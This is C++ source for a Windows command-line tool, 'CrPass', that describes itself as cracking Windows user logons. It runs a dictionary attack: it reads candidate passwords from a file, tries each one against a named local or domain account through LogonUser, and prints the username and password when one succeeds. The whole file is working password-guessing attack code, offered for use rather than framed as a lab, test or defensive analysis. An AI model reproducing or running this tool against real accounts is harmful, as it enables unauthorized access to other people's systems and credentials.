#include <Windows.h>
#include <conio.h>
#include <cstdio>
#include "malloc.h"

void die(const char* format, ...) {
	va_list v;
	va_start(v, format);
	vfprintf(stderr, format, v);
	exit(1);
}

int logon(char* user, char* pass, char* domain, bool showmsg) {
	DWORD ret = 1;
	HANDLE tok;
	STARTUPINFOA   si;  
    PROCESS_INFORMATION pi;  
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
	if (0 == LogonUser(user,domain,pass,LOGON32_LOGON_INTERACTIVE,LOGON32_PROVIDER_DEFAULT,&tok)) 
	{
		ret = 0;
	} 
	else 
	{ 
		printf("Good luck. UserName:%s PassWord:%s\n",user,pass);
	}
	CloseHandle(tok);
	return ret;
}


int logondomain(char* user, char* pass, char* domain, bool showmsg) {
	DWORD ret = 1;
	HANDLE tok;
	char* msg;
	if (!LogonUserA(user,domain,pass,LOGON32_LOGON_NETWORK,LOGON32_PROVIDER_DEFAULT,&tok)) {
		ret = 0;
		if (showmsg) {
			ret = GetLastError();
			FormatMessageA(
				FORMAT_MESSAGE_ALLOCATE_BUFFER | 
				FORMAT_MESSAGE_FROM_SYSTEM |
				FORMAT_MESSAGE_IGNORE_INSERTS,
				NULL,
				ret,
				NULL,
				(char*)&msg,
				0, NULL
			);
			puts(msg);
			LocalFree(msg);
		}
	} 
	else 
	{ 
		//if (showmsg)
		printf("domain.Good luck. UserName:%s PassWord:%s\n",user,pass);
	}
	CloseHandle(tok);
	return ret;
}


int main(int argc, char ** argv) {
	if (argc == 1)
		die(
			"CrPass"
			"Cracking Windows user logons.\n"
			"Usage: %s [Username [-w Passfile] [-d Domain]] [-h HideShow]\n"
			"Example: %s.exe administrator -w password.txt -h\n\n"
			"UserName   Name of user account to try logging in as\n"
			"-w Passfile  Dictionary attack. Using file containing line by line passwords\n"			
			"-d Domain  Optional. Remote Domain or server holding the user account\n"
			"-h Hide  Optional. Hide the progress bar \n"
			, argv[0],argv[0]
		);

	FILE* f;
	char *pass, *domain = ".", *wfile;
	bool bf = false;
//	bool yu = false;
	int i;
	for (i = 1; i < argc; i++) 
	{
		if (!strcmp(argv[i], "-d")) domain = argv[++i];
		else if (!strcmp(argv[i], "-w")) wfile = argv[++i];
		else if (!strcmp(argv[i], "-h")) bf = true;
	//	else if (!strcmp(argv[i], "-d")) yu = true;
	}

	pass = (char*)malloc(256);
	if (!(f = fopen(wfile, "r"))) die("Failed to open %s\n", wfile);
	while (!feof(f)) {
		if (_kbhit())
			if (_getch() == '\r') {
				fclose(f);
				free(pass);
				puts("\nStopped.");
				return 0;
			}
		if (!fgets(pass, 256, f)) break;
		*strpbrk(pass, "\r\n") = 0;
		if(!bf)
		{
		puts(pass);
		}
			if (logon(argv[1], pass, domain, false)) 
			{
			puts("\nSuccess!");
			fclose(f);
			free(pass);
			return 0;
			}

	}
	puts("\nEnd. Not find the password");
	fclose(f);
	free(pass);
	return 0;
}
